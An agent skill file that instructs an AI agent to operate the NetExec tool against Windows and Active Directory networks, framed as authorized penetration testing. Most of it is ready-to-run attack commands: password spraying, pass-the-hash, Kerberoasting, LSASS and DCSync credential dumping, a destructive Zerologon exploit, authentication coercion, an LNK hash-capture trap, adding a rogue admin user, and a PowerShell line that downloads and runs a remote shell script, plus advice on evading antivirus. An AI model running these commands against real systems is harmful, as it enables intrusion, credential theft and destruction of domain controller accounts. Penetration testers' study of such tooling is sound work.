---
name: netexec
description: >
  Operate NetExec (nxc) — the successor to CrackMapExec maintained at
  Pennyw0rth/NetExec (4.2k+ stars). Use when enumerating and attacking Windows/AD
  environments via SMB, LDAP, WinRM, SSH, FTP, MSSQL, or RDP. Covers credential
  checking, pass-the-hash, Kerberos auth, share/user/group/session enumeration,
  remote command execution, the module system (lsassy, mimikatz, spider_plus,
  zerologon, procdump), BloodHound integration, and Active Directory password
  spray workflows for authorized penetration testing engagements.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/Pennyw0rth/NetExec
---

# netexec Agent Skill

## When to Use This Skill

Use this skill when:
- Validating credentials or spraying passwords across a Windows/AD environment
- Enumerating shares, users, groups, sessions, or password policy via SMB or LDAP
- Executing commands on remote Windows hosts (WinRM, SMB, SSH)
- Performing pass-the-hash or Kerberos authentication without plaintext credentials
- Running post-exploitation modules (lsassy, mimikatz, spider_plus, zerologon)
- The user asks about CrackMapExec — NetExec (nxc) is its direct successor

## What NetExec Does

NetExec (invoked as `nxc`) is a network exploitation and post-exploitation framework focused on Active Directory environments. It provides a unified interface for authenticating to and enumerating multiple services simultaneously, making it the standard tool for credential validation, lateral movement, and AD enumeration. It replaced CrackMapExec (cme) with improved protocol support, module architecture, and maintenance.

## Installation

```bash
# Kali Linux (pre-installed or via apt)
sudo apt update && sudo apt install netexec
nxc --version

# pipx (recommended — isolated environment)
pipx install netexec
nxc --version

# pip
pip3 install netexec

# From source (latest development)
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec
pip3 install poetry
poetry install
poetry run nxc --help

# Docker
docker pull ghcr.io/pennyw0rth/netexec:latest
docker run --rm ghcr.io/pennyw0rth/netexec nxc smb --help

# Verify modules are available
nxc smb --list-modules
```

## Core Concepts

### Protocol Modules

NetExec uses `nxc <protocol>` as the entry point:

| Protocol | Port(s) | Use Case |
|----------|---------|----------|
| `smb` | 445, 139 | Windows auth, shares, execution |
| `ldap` | 389, 636 | AD enumeration, user/group/policy |
| `winrm` | 5985, 5986 | PS remoting, command execution |
| `ssh` | 22 | Linux/Windows SSH |
| `ftp` | 21 | FTP credential testing |
| `mssql` | 1433 | SQL Server auth and query |
| `rdp` | 3389 | RDP credential validation |
| `wmi` | 135 | WMI-based command execution |
| `vnc` | 5900 | VNC credential testing |

### Authentication Modes

```
-u/-p         plaintext credentials
-H            NTLM hash (pass-the-hash)
-k            Kerberos (CCACHE or keytab)
--local-auth  authenticate as local account (not domain)
-d DOMAIN     specify domain
--aesKey      AES Kerberos key (pass-the-key)
```

### Output Colors

- **Green (pwn3d!)** — credentials valid + user is local admin
- **Green (success)** — credentials valid, not admin
- **Red** — authentication failed
- **Yellow** — host unreachable or port closed

## CLI Reference

### Credential Validation

```bash
# SMB credential check — single host
nxc smb 10.10.10.10 -u admin -p 'Password123'

# Entire subnet
nxc smb 10.10.10.0/24 -u admin -p 'Password123'

# From target file
nxc smb targets.txt -u admin -p 'Password123'

# Domain credentials
nxc smb 10.10.10.10 -d DOMAIN -u jsmith -p 'Summer2024!'

# Local authentication (no domain)
nxc smb 10.10.10.10 -u localadmin -p 'localpass' --local-auth

# Pass-the-hash (NTLM)
nxc smb 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Pass-the-hash — no NT hash, LM only (empty NT)
nxc smb 10.10.10.10 -u administrator -H :NTLM_HASH_ONLY

# Kerberos auth (use existing CCACHE)
export KRB5CCNAME=/tmp/krb5cc_jsmith
nxc smb dc01.domain.local -k

# Kerberos with explicit ticket
nxc smb dc01.domain.local -k --use-kcache

# Null session (anonymous)
nxc smb 10.10.10.10 -u '' -p ''

# Guest access
nxc smb 10.10.10.10 -u 'Guest' -p ''
```

### Enumeration Flags (SMB)

```bash
# Shares — list accessible shares
nxc smb 10.10.10.10 -u user -p pass --shares
nxc smb 10.10.10.0/24 -u user -p pass --shares 2>/dev/null | grep -v "Failed"

# Users — enumerate domain users (requires domain auth)
nxc smb dc01 -u user -p pass --users
nxc smb dc01 -u user -p pass --users | tee users.txt

# Groups
nxc smb dc01 -u user -p pass --groups
nxc smb dc01 -u user -p pass --local-groups  # Local groups on target

# Logged on users (requires admin)
nxc smb 10.10.10.0/24 -u admin -p pass --logged-on-users

# Active sessions
nxc smb 10.10.10.10 -u admin -p pass --sessions

# Password policy
nxc smb dc01 -u user -p pass --pass-pol

# Disks (drives)
nxc smb 10.10.10.10 -u admin -p pass --disks

# Installed software
nxc smb 10.10.10.10 -u admin -p pass --software

# List RIDs (user/group enumeration without admin)
nxc smb 10.10.10.10 -u '' -p '' --rid-brute 10000
```

### Enumeration Flags (LDAP)

```bash
# Users via LDAP
nxc ldap dc01 -u user -p pass --users

# Groups
nxc ldap dc01 -u user -p pass --groups

# Password policy
nxc ldap dc01 -u user -p pass --pass-pol

# ASREPRoasting — find users without pre-auth
nxc ldap dc01 -u user -p pass --asreproast asrep_hashes.txt

# Kerberoasting — find SPNs
nxc ldap dc01 -u user -p pass --kerberoast kerb_hashes.txt

# Trusted domains
nxc ldap dc01 -u user -p pass --trusted-for-delegation

# Admin counts
nxc ldap dc01 -u user -p pass --admin-count

# GMSA passwords (if authorized)
nxc ldap dc01 -u user -p pass --gmsa

# BloodHound collection via LDAP
nxc ldap dc01 -u user -p pass --bloodhound --collection All -ns 10.10.10.10
```

### Command Execution

```bash
# Run cmd.exe command (SMB — requires admin)
nxc smb 10.10.10.10 -u admin -p pass -x "whoami"
nxc smb 10.10.10.10 -u admin -p pass -x "net user hacker P@ssw0rd! /add"

# Run PowerShell command
nxc smb 10.10.10.10 -u admin -p pass -X "Get-Process"
nxc smb 10.10.10.10 -u admin -p pass -X "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/shell.ps1')"

# WinRM (PS Remoting) command execution
nxc winrm 10.10.10.10 -u admin -p pass -x "whoami"
nxc winrm 10.10.10.10 -u admin -p pass -X "Get-NetAdapter"

# Execution method selection (SMB)
nxc smb 10.10.10.10 -u admin -p pass --exec-method smbexec -x "whoami"
nxc smb 10.10.10.10 -u admin -p pass --exec-method wmiexec -x "whoami"
nxc smb 10.10.10.10 -u admin -p pass --exec-method atexec -x "whoami"
nxc smb 10.10.10.10 -u admin -p pass --exec-method mmcexec -x "whoami"

# MSSQL — run OS commands
nxc mssql 10.10.10.10 -u sa -p password --local-auth -x "whoami"
# MSSQL — run SQL query
nxc mssql 10.10.10.10 -u sa -p password -q "SELECT name FROM master.dbo.sysdatabases"
```

### Module System

```bash
# List all available modules for a protocol
nxc smb --list-modules
nxc ldap --list-modules
nxc mssql --list-modules

# Module info
nxc smb -M lsassy --options

# Run module
nxc smb 10.10.10.10 -u admin -p pass -M <module_name>
```

### Key Modules

```bash
# lsassy — dump credentials from LSASS (Python-based, no Mimikatz binary)
nxc smb 10.10.10.10 -u admin -p pass -M lsassy

# mimikatz — run Mimikatz on target
nxc smb 10.10.10.10 -u admin -p pass -M mimikatz
nxc smb 10.10.10.10 -u admin -p pass -M mimikatz -o COMMAND="lsadump::dcsync /user:krbtgt"

# procdump — dump LSASS via Sysinternals procdump
nxc smb 10.10.10.10 -u admin -p pass -M procdump

# spider_plus — recursive share spider with content search
nxc smb 10.10.10.10 -u user -p pass -M spider_plus
nxc smb 10.10.10.10 -u user -p pass -M spider_plus -o READ_ONLY=False DOWNLOAD_FLAG=True
# Output: /tmp/nxc_spider_plus/ with JSON and downloaded files

# zerologon — check/exploit CVE-2020-1472 Zerologon
nxc smb dc01 -u '' -p '' -M zerologon
nxc smb dc01 -u '' -p '' -M zerologon -o EXPLOIT=True  # DESTRUCTIVE — sets DC machine acc pass to empty

# petitpotam — coerce DC authentication (for relay/ADCS abuse)
nxc smb dc01 -u user -p pass -M petitpotam -o LISTENER=10.10.14.1

# dfscoerce — DFS coerce (alternative to PetitPotam)
nxc smb dc01 -u user -p pass -M dfscoerce -o LISTENER=10.10.14.1

# nopac — check CVE-2021-42278/42287 (sAMAccountName spoofing)
nxc smb dc01 -u user -p pass -M nopac

# gpp_password — find passwords in SYSVOL Group Policy Preferences
nxc smb dc01 -u user -p pass -M gpp_password

# gpp_autologin — find autologon credentials in GPP
nxc smb dc01 -u user -p pass -M gpp_autologin

# msol — dump Azure AD sync credentials (AAD Connect)
nxc smb dc01 -u admin -p pass -M msol

# nanodump — stealth LSASS dump
nxc smb 10.10.10.10 -u admin -p pass -M nanodump

# slinky — place LNK file in writeable share for hash capture
nxc smb 10.10.10.10 -u user -p pass -M slinky -o SERVER=10.10.14.1 NAME=important
```

## Common Workflows

### Initial Credential Validation + Privilege Check

```bash
# Validate single cred against subnet, find admins
nxc smb 10.10.10.0/24 -u jsmith -p 'Password123' 2>/dev/null | grep -v "Failed\|Error"

# Extract only successful ones
nxc smb 10.10.10.0/24 -u jsmith -p 'Password123' 2>/dev/null | grep "+"

# Find hosts where credential has local admin (pwn3d!)
nxc smb 10.10.10.0/24 -u jsmith -p 'Password123' 2>/dev/null | grep "pwn3d"
```

### Password Spray — AD Environment

```bash
# Step 1: Enumerate users
nxc ldap dc01.domain.local -u jsmith -p 'Password123' --users | \
  awk '/SAMAccountName/ {print $5}' > /tmp/users.txt

# Step 2: Check lockout policy
nxc smb dc01.domain.local -u jsmith -p 'Password123' --pass-pol

# Step 3: Spray with one password (stay under lockout threshold)
nxc smb 10.10.10.0/24 -u /tmp/users.txt -p 'Winter2024!' --no-bruteforce 2>/dev/null | grep "+"

# Step 4: Wait > lockout observation window, try next password
nxc smb 10.10.10.0/24 -u /tmp/users.txt -p 'Spring2024!' --no-bruteforce 2>/dev/null | grep "+"

# --no-bruteforce ensures one password per user (spray, not brute force)
```

### Post-Compromise — Credential Dumping Chain

```bash
# Confirm admin access
nxc smb 10.10.10.10 -u admin -H NTLM_HASH

# Dump LSASS with lsassy
nxc smb 10.10.10.10 -u admin -H NTLM_HASH -M lsassy | tee lsassy_output.txt

# Parse output for hashes and passwords
grep -E "DOMAIN|Username|Password|NTLM" lsassy_output.txt

# Spray newly found hash across subnet
nxc smb 10.10.10.0/24 -u administrator -H NEW_NTLM_HASH --local-auth | grep "pwn3d"
```

### Share Spider and Sensitive Data Hunt

```bash
# Find readable shares across subnet
nxc smb 10.10.10.0/24 -u user -p pass --shares 2>/dev/null | grep "READ\|WRITE"

# Spider all readable shares recursively (spider_plus)
nxc smb 10.10.10.0/24 -u user -p pass -M spider_plus 2>/dev/null

# Review JSON output for interesting files
cat /tmp/nxc_spider_plus/10.10.10.10.json | \
  python3 -m json.tool | grep -i "pass\|cred\|secret\|key\|config"
```

### BloodHound Integration

```bash
# Collect all BloodHound data via LDAP
nxc ldap dc01.domain.local -u user -p pass \
  --bloodhound --collection All \
  -ns 10.10.10.10

# Output: *.json files in current directory or specified path
# Import into BloodHound GUI (drag and drop or Upload Data)

# Or use bloodhound-python directly and specify DC
bloodhound-python -u user -p pass -d domain.local \
  -dc dc01.domain.local -c All -ns 10.10.10.10
```

## Advanced Techniques

### Kerberos Authentication (No Password)

```bash
# Get TGT with impacket
python3 /opt/impacket/examples/getTGT.py domain.local/user:password
export KRB5CCNAME=user.ccache

# Use ticket with NetExec
nxc smb dc01.domain.local -k --use-kcache

# ASREPRoasting (no creds needed for pre-auth disabled accounts)
nxc ldap dc01 -u '' -p '' --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoasting
nxc ldap dc01 -u user -p pass --kerberoast kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt
```

### Database Interaction

```bash
# NetExec maintains a local database of results
nxc smb --help  # Shows --export options

# View stored hosts
nxc db  # Opens interactive nxcdb shell
# nxcdb> hosts
# nxcdb> creds
# nxcdb> shares
# nxcdb> export creds csv /tmp/creds.csv
```

## Troubleshooting

**"STATUS_ACCESS_DENIED" on SMB:**
- Credentials valid but user lacks admin rights — use `--shares` to confirm basic access
- SMB signing enforced — cannot perform certain operations without signing

**"STATUS_LOGON_FAILURE":**
- Wrong credentials, domain, or user locked out
- Try `--local-auth` if targeting a local account

**Kerberos errors (KDC_ERR_PREAUTH_FAILED):**
- Verify time sync: `sudo ntpdate dc01.domain.local` (Kerberos requires <5 min skew)
- Confirm DNS resolves domain: `nslookup domain.local`

**WinRM "Verify that the WSMAN service is running":**
- WinRM must be enabled on target: `Enable-PSRemoting -Force`
- Confirm port 5985/5986 open: `nxc winrm 10.10.10.10 -u admin -p pass`

**Module fails to load:**
```bash
# Update NetExec
pip3 install --upgrade netexec
# or
cd NetExec && git pull && poetry install
```

**lsassy fails (LSASS dump):**
- Try alternative method: `-M procdump`, `-M nanodump`, or `-M mimikatz`
- AV may be blocking — use obfuscated variant or dump manually with task manager
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [Hardening Domain Controllers: The 10-Point Checklist Most Companies Skip](https://redhound.us/hardening-domain-controllers)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
